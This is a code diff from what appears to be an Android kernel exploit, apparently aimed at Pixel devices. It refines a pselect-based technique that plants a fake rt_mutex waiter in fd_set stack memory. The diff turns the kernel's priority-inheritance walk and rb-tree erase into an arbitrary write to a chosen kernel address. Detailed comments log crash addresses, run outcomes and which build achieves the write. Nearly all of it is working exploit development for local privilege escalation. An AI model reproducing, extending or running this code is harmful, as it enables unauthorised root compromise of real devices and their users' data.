@@ -319,7 +319,20 @@ namespace ghostlock::route {
                    : kernel::PSELECT_WAITER_WORD_SHIFT;
     }
 
-    static void pselect_put_waiter_word(
+    /* Places one waiter word and reads it back.
+     *
+     * A word that does not land is not cosmetic. The PI walk loads
+     * `waiter->lock` (offset 0x38 = waiter word 9) and dereferences it --
+     * rt_mutex_adjust_prio_chain+0x188 is `ldapr w8, [x27]` -- so a wrong or
+     * missing word there faults in kernel context. That is exactly the
+     * 2026-10-09 oops: x27 = 0x00004d2600000000, a non-canonical address.
+     *
+     * The read-back proves only the USER copy, because the walk reads the
+     * kernel's stack copy of these sets. But it separates the two candidate
+     * causes -- "we stamped the wrong thing" from "something changed the value
+     * after we stamped it" -- which is precisely what that oops left open.
+     */
+    static bool pselect_put_waiter_word(
         select_stack::SelectStackRoute *context, int32_t words_per_set,
         int32_t waiter_word, uint64_t value, const char *name) {
         int32_t global_word = pselect_waiter_shift(context) + waiter_word;
@@ -332,7 +345,23 @@ namespace ghostlock::route {
                        "words_per_set=%d nfds=%d\n",
                        name, waiter_word, global_word, words_per_set,
                        PSELECT_ROUTE_NFDS);
+            return false;
         }
+
+        const int32_t set_idx = global_word / words_per_set;
+        const int32_t word_idx = global_word % words_per_set;
+        const fd_set *set = set_idx == 0   ? context->input_set.raw()
+                            : set_idx == 1 ? context->output_set.raw()
+                                           : context->exception_set.raw();
+        const uint64_t back = fdset_get_word(set, word_idx);
+        if (back != value) {
+            pr_warning("waiter word %s did not land: wrote 0x%llx read back "
+                       "0x%llx (global_word=%d)\n",
+                       name, static_cast<unsigned long long>(value),
+                       static_cast<unsigned long long>(back), global_word);
+            return false;
+        }
+        return true;
     }
 
     static std::array<int32_t, 3> standard_io_backup = {-1, -1, -1};
@@ -356,7 +385,29 @@ namespace ghostlock::route {
         }
     }
 
-    static void select_stack_build_fdsets(select_stack::SelectStackRoute *context) {
+    /* Stride for the anchor rotation. An rt_mutex here is ~0x28 bytes and the
+     * kernel only touches wait_lock (0x00), waiters.rb_root / rb_leftmost
+     * (0x08/0x10) and owner (0x18), so 0x80 leaves a >2.5x margin.
+     * `dump_skip.zeroes` spans image +0x2a3a590 .. +0x2a3b8d4 (~78 KB, measured),
+     * so there are ~1000 slots and a run uses a few dozen. */
+    static constexpr uintptr_t kLockAnchorStride = 0x80;
+
+    /* Monotonic across the whole process -- deliberately NOT the attempt index.
+     * The index resets every stage, so keying on it put W2's attempt 1 back on
+     * the very slot W1's attempt 1 had left a dead waiter in (measured, run 5:
+     * the log shows +0x0, +0x80, then +0x0 again for the next stage). A serial
+     * that only ever increases means no stamp can reuse a slot, which is the
+     * whole point -- the anchor is not private memory, the kernel enqueues
+     * waiters into it (rb_add_cached writes waiters.rb_leftmost) and those
+     * waiters die with the attempt's pselect stack frame. Single-threaded: the
+     * route's pselect loop runs on the main thread. */
+    static uintptr_t select_stack_anchor_slot() {
+        static uintptr_t serial = 0;
+        return serial++;
+    }
+
+    static void select_stack_build_fdsets(select_stack::SelectStackRoute *context,
+                                          int32_t attempt) {
         select_stack::FdSet *in = &context->input_set;
         select_stack::FdSet *out = &context->output_set;
         select_stack::FdSet *ex = &context->exception_set;
@@ -375,26 +426,132 @@ namespace ghostlock::route {
         };
 
         if (compact) {
-            /* 6.1 compact write route (Root-My-Pixel-Payloads src/61/fops.c): tree/pi parents carry
-         * the write value, children the write target; waiter->task is the
-         * payload fake_task (planted fields for the PI walk). */
+            /* Tree entry = all-zero PARKING node, and that zero pc is load-bearing:
+             * it makes rt_mutex_dequeue()'s erase __rb_erase_augmented's case 1 with
+             * NO children, whose __rb_change_child(node, NULL, parent = pc & ~3 = 0,
+             * root) takes the `parent == NULL` arm and writes
+             *   root->rb_node = NULL
+             * — the erase clears the lock's waiter tree itself.
+             *
+             * That is what the J/K runs needed. Carrying the payload here put
+             * `pc = value != 0` in that slot, so the same call wrote its collateral
+             * through *(value+8) and left lock->waiters.rb_root.rb_node still
+             * pointing at the node it had just erased — whose rb_left = target is a
+             * live kernel address. rt_mutex_enqueue()'s inlined `while (*link)`
+             * then descends from that stale root; the probes caught it (walk+0x51c
+             * `ee`, then +0x544 `el` twice) and it is the freeze. With the root
+             * NULLed the descent exits on its first test, rb_link_node() installs
+             * this waiter as the root with a NULL parent, and rb_insert_color()
+             * breaks on its `!parent` arm.
+             *
+             * The write itself moves to the PAGE waiter's pi node (util.cpp), which
+             * [11] reaches deterministically once this re-link sets
+             * root->rb_leftmost = &waiter->tree_entry: rt_mutex_top_waiter() then
+             * returns this waiter, so `waiter == rt_mutex_top_waiter(lock)` holds and
+             * rt_mutex_dequeue_pi(fake_task, ...) runs its own case-1 erase. */
+            /* BUILD K SHAPE (restored 2026-10-08): the payload rides the TREE
+             * entry, words 2/3/4; 5/6/7 stay zero pi-side parking. Build N moved
+             * the same {pc = fake_right, right = 0, left = target} triple down to
+             * words 5/6/7 (the PI entry) — that is the build that wrote nothing,
+             * remove_waiter's erases showing as node = waiter+0x18. The tree
+             * entry's erase at rtmutex.c:663 is the only workable vehicle, which
+             * is why K is the build that lands W1 (3 consecutive runs, 2 of them
+             * reaching W2 attempt 1). Word->value mapping transcribed from the
+             * session record and verified against the shipped
+             * GhostLock-K-rootnull.apk binary. */
+            /* The `lock` word decides where the walk's rt_mutex tree lives.
+             * Default: the fake rt_mutex in the reclaimed payload page (the
+             * behaviour every previous build had). With
+             * route.select_stack.lock_anchor_image set, point it at an
+             * image-relative zero, writable, reference-free region instead, so
+             * rt_mutex_enqueue's descent exits on its first test whatever that
+             * page happens to contain. data_alias() maps the image offset to the
+             * direct-map alias the walk dereferences -- the same conversion the
+             * working W1 write already depends on. The resolved address is
+             * printed so the host can probe exactly what the walk used.
+             * See docs/analysis/payload-page-option2-plan.md. */
+            uint64_t lock_word = session::g_exploit_session.heap.current.fake_lock;
+            if (const auto anchor = context->layout.lock_anchor_image) {
+                /* Rotate the anchor per attempt. This lock object is NOT private
+                 * to us: the kernel enqueues waiters into it (rb_add_cached sets
+                 * lock->waiters.rb_leftmost), and those waiters live in a pselect
+                 * stack frame that dies with the attempt. Sharing one anchor
+                 * across attempts therefore leaves each attempt tripping over the
+                 * previous one's dead waiter -- run 4 followed rb_leftmost into an
+                 * unmapped stack page and oopsed at rt_mutex_adjust_prio_chain
+                 * +0x3f0. A fresh zeroed rt_mutex per attempt means a stale
+                 * pointer can never be reached a second time.
+                 * See docs/analysis/stale-waiter-lifetime-plan.md. */
+                const uintptr_t slot = select_stack_anchor_slot();
+                const uintptr_t rotation = kLockAnchorStride * slot;
+                lock_word = session::g_exploit_session.addresses.data_alias(
+                    static_cast<uintptr_t>(kernel::KIMAGE_TEXT_BASE + *anchor) + rotation);
+                pr_info("[route] lock anchor: image +0x%llx (attempt %d, slot %llu, "
+                        "+0x%llx) -> direct map 0x%llx\n",
+                        static_cast<unsigned long long>(*anchor), attempt,
+                        static_cast<unsigned long long>(slot),
+                        static_cast<unsigned long long>(rotation),
+                        static_cast<unsigned long long>(lock_word));
+            }
+
+            /* The tree entry is the write vehicle, and its stamp comes from the
+             * same helper the compact encoder uses so the two cannot drift:
+             *   pointer layouts -> {pc = value, right = 0, left = target}: the
+             *     erase stores pc at rb_left and re-parents through pc & ~3, so
+             *     the collateral lands in that pointer's child slot.
+             *   leaf/zero       -> {pc = target - 8, right = 0, left = 0}: the node
+             *     is childless, nothing is stored on it, and the erase's collateral
+             *     writes NULL at *(target). A parentless pc here would instead
+             *     plant the target in the lock's tree root, which the walk's
+             *     dequeue -> enqueue then descends through as if it were a node
+             *     (runs Q1/Q2, rt_mutex_adjust_prio_chain+0x548).
+             * See waiter_tree_stamp() in memory/payload_builder.h. */
+            const memory::PayloadWriteLayout stamp_layout = {
+                .parent = (session::g_exploit_session.heap.current.fake_parent),
+                .right = (session::g_exploit_session.heap.current.fake_right),
+                .left = (session::g_exploit_session.heap.current.fake_left),
+            };
+            const memory::WaiterTreeStamp stamp =
+                    memory::waiter_tree_stamp(stamp_layout);
+            pr_info("[route] tree stamp pc=0x%llx right=0x%llx left=0x%llx target=0x%llx\n",
+                    static_cast<unsigned long long>(stamp.pc),
+                    static_cast<unsigned long long>(stamp.right),
+                    static_cast<unsigned long long>(stamp.left),
+                    static_cast<unsigned long long>(request->target));
+
             struct pselect_waiter_word words[] = {
-                {2, (session::g_exploit_session.heap.current.fake_right), "tree_pc"},
-                {3, 0, "tree_right"},
-                {4, request->target, "tree_left"},
-                {5, (session::g_exploit_session.heap.current.fake_right), "pi_pc"},
+                {2, stamp.pc, "tree_pc"},
+                {3, stamp.right, "tree_right"},
+                {4, stamp.left, "tree_left"},
+                /* PI side parks: build N carried the payload here instead (the
+             * rt_mutex_dequeue_pi erase) and wrote nothing — see the note above.
+             * Zeroes keep the pi node out of every erase and every descent. */
+                {5, 0, "pi_pc"},
                 {6, 0, "pi_right"},
-                {7, request->target, "pi_left"},
+                {7, 0, "pi_left"},
                 {8, (session::g_exploit_session.heap.current.fake_task), "task"},
-                {9, (session::g_exploit_session.heap.current.fake_lock), "lock"},
-                {10, (static_cast<uint64_t>(kernel::FAKE_WAITER_PRIO) << 32) | 3, "wake_prio"},
+                {9, lock_word, "lock"},
+                /* waiter+0x40 is `int prio` on 5.10 (no wake_state field: that is
+                 * the 6.6 shape, where the packed {wake_state, prio} word applied).
+                 * The old packing left prio = 3 with 140 in the padding word. */
+                {10, static_cast<uint64_t>(kernel::FAKE_WAITER_PRIO), "prio"},
                 {11, 0, "deadline"},
                 {12, 0, "ww_ctx"},
             };
+
+            bool stamped = true;
             for (size_t i = 0; i < std::size(words); i++) {
                 struct pselect_waiter_word *w = &words[i];
-                pselect_put_waiter_word(context, words_per_set,
-                                        w->word, w->value, w->name);
+                if (!pselect_put_waiter_word(context, words_per_set, w->word,
+                                             w->value, w->name)) {
+                    stamped = false;
+                }
+            }
+            if (!stamped) {
+                pr_warning("fake waiter (compact) is INCOMPLETE -- the walk "
+                           "dereferences waiter+0x38 lock, +0x40 prio and "
+                           "+0x48 deadline; a wrong word there oopses at "
+                           "rt_mutex_adjust_prio_chain+0x188\n");
             }
         } else {
             /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
@@ -413,10 +570,17 @@ namespace ghostlock::route {
                 {13, (session::g_exploit_session.heap.current.fake_lock), "lock"},
                 {14, 3, "wake_state"},
             };
+            bool stamped = true;
             for (size_t i = 0; i < std::size(words); i++) {
                 struct pselect_waiter_word *w = &words[i];
-                pselect_put_waiter_word(context, words_per_set,
-                                        w->word, w->value, w->name);
+                if (!pselect_put_waiter_word(context, words_per_set, w->word,
+                                             w->value, w->name)) {
+                    stamped = false;
+                }
+            }
+            if (!stamped) {
+                pr_warning("fake waiter (6.6 shape) is INCOMPLETE -- see the "
+                           "note in pselect_put_waiter_word\n");
             }
         }
     }
@@ -454,7 +618,7 @@ namespace ghostlock::route::select_stack {
             return fail(32, errno);
         }
 
-        route::select_stack_build_fdsets(this);
+        route::select_stack_build_fdsets(this, 1);
         pr_info("pselect route setup shift=%d page=%016zx "
                 "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
                 "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
@@ -503,7 +667,7 @@ namespace ghostlock::route::select_stack {
                     (void) fail(35, errno);
                     break;
                 }
-                route::select_stack_build_fdsets(this);
+                route::select_stack_build_fdsets(this, attempt);
                 route::install_selected_fds(input_set.raw(), output_set.raw(),
                                             exception_set.raw(), block_fd(),
                                             pipe_write.get());
